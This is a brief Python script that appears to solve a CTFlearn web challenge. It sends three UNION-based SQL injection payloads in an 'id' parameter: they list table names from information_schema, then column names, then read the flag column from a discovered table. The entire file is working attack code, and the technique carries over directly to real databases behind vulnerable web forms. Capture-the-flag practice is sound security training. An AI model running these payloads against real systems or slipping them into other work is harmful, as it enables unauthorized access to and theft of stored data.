import requests

url = "http://web.ctflearn.com/web8"

params = {
  "id": "1 UNION SELECT table_name,2,3,4 FROM information_schema.tables WHERE table_schema=database()"
}

response = requests.get(url, params=params)

print(response.text)

params = {
  "id": "1 UNION SELECT column_name,2,3,4 FROM information_schema.columns WHERE table_schema=database()"
}

response = requests.get(url, params=params)

print(response.text)

params = {
  "id": "1 UNION SELECT f0und_m3,2,3,4 FROM w0w_y0u_f0und_m3"
}

response = requests.get(url, params=params)

print(response.text)
